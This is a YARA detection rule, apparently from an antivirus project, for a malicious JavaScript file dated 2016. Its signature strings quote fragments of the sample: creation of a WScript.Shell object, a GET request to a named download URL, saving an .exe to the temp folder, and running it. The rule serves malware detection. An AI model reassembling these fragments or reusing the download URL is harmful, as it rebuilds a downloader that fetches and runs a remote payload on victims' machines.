rule sig_20160328_d7626eaa108b0c56f3850c4990f9e989 {
  meta:
    description = "datamaliciousorder - file 20160328_d7626eaa108b0c56f3850c4990f9e989.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9fec015ec441905bfdb5de8055a054f2af482efad40ce1a8a0634a789e005a1f"

  strings:
    $s1  = "function Mspudkond() {return Guyjuutr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"oDIbKY1prH.exe\";};" fullword ascii
    $s2  = "Oyxahlge[Rstyo](\"GET\", \"http://foothillsofhemet.com/k4sifs\", false);" fullword ascii
    $s3  = "do {WScript[Xzfxjplkk](Rjogdmsmdd() * 11)} while (Oyxahlge[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Guyjuutr = function Pravoss() {return WScript[Iiunfj](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Tjylnmkmqo(Jyrjefm, Jedleybnq){return Jyrjefm - Jedleybnq;};" fullword ascii
    $s6  = "function Idhqs() {return ((Brpdg == true) && (Brpdg == Vzrdyyqk)) ? 1 : Xvlay;};" fullword ascii
    $s7  = "function Ozegwwmtk(Ldtcd){Guyjuutr[\"Run\"](Ldtcd, Xvlay, Xvlay);};" fullword ascii
    $s8  = "function Iyyumjsouw()" fullword ascii
    $s9  = "var Igvensfdn = new this[\"Date\"]();" fullword ascii
    $s10 = "function Lggflb(Dojpmppk) {var Iwdkgu = (1, 2, 3, 4, 5, Dojpmppk); return Iwdkgu;};" fullword ascii
    $s11 = " while (Xrmscb){" fullword ascii
    $s12 = "function Cwpjvotond(){return Cmgjndek;};" fullword ascii
    $s13 = "var Xgnyvvee = false;" fullword ascii
    $s14 = "function Rjogdmsmdd(){return 22;};" fullword ascii
    $s15 = "return Tjylnmkmqo(Rergp, Czxecdiiix);" fullword ascii
    $s16 = "Vzrdyyqk = true; " fullword ascii
    $s17 = "var Brpdg = false;" fullword ascii
    $s18 = "var Vzrdyyqk = false;" fullword ascii
    $s19 = "Brpdg = true; " fullword ascii
    $s20 = "function Xhhqejfpi(){return Iiunfj;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}